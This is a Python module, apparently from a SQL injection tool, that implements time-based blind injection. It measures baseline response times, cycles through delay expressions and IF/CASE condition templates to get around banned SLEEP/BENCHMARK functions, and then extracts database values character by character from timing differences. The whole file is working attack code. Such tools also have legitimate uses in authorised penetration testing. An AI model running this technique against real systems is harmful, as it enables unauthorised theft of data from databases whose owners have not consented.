# -*- coding: utf-8 -*-
"""Time-based blind injection (v1.1: both the delay expression and condition template are rotated to find a usable one)

When SLEEP() / BENCHMARK() are banned, the dialect provides alternative spellings,
such as MySQL's full-table Cartesian re-query and SQLite's recursive CTE.
"""
from techniques.base import BaseTechnique


class TimeTechnique(BaseTechnique):
    name = "Time Blind"

    # Conditional delay templates
    IF_TEMPLATES = [
        "IF(({c}),{d},0)",
        "(CASE WHEN ({c}) THEN {d} ELSE 0 END)",
    ]

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.baseline_time = None
        self.delay_threshold = 2.0
        self.sleep_seconds = 3
        self.delay_expr = None
        self.if_tpl = self.IF_TEMPLATES[0]

    # ---------------- Measurement ----------------
    def _measure_final(self, final):
        times = []
        for _ in range(3):
            r = self.req.send(final, use_cache=False)
            if r["status"] == -1:
                return None
            times.append(r["time"])
        times.sort()
        return times[len(times) // 2]

    def _final(self, expr):
        return self.det.prefix + self._t(expr) + self.det.suffix

    # ---------------- Probe ----------------
    def probe(self):
        t0 = self._measure_final("1")
        if t0 is None:
            return False
        self.baseline_time = t0

        need = self.sleep_seconds * 0.6
        for d in self.dialect.sleep_expr_variants(self.sleep_seconds):
            t1 = self._measure_final(self._final(f"1 AND {d}"))
            if t1 is None or t1 - t0 < need:
                continue
            # Found a delaying spelling; now calibrate the "condition template"
            for if_tpl in self.IF_TEMPLATES:
                ct = if_tpl.format(c="2>1", d=d)
                cf = if_tpl.format(c="1>2", d=d)
                tt = self._measure_final(self._final(f"1 AND {ct}"))
                tf = self._measure_final(self._final(f"1 AND {cf}"))
                if tt is None or tf is None:
                    continue
                if tt - t0 >= need * 0.8 and abs(tf - t0) < need * 0.8:
                    self.delay_expr = d
                    self.if_tpl = if_tpl
                    self.delay_threshold = t0 + need * 0.5
                    print(f"    [+] Delay spelling: {d[:48]}{'...' if len(d) > 48 else ''}")
                    return True
            # Every condition template failed, though it does delay -> unconditional delay cannot blind-inject; try the next
        return False

    # ---------------- Decision ----------------
    def _cond_true(self, condition):
        if not self.delay_expr:
            return False
        expr = self.if_tpl.format(c=condition, d=self.delay_expr)
        t = self._measure_final(self._final(f"1 AND {expr}"))
        if t is None:
            return False
        return t >= self.delay_threshold

    # ---------------- Extraction ----------------
    def extract_length(self, sql_expr):
        return self._binary_search_length(sql_expr)

    def extract(self, sql_expr):
        length = self.extract_length(sql_expr)
        if length <= 0:
            return ""
        chars = []
        for i in range(1, length + 1):
            chars.append(self._binary_search_char(sql_expr, i))
        return "".join(chars)
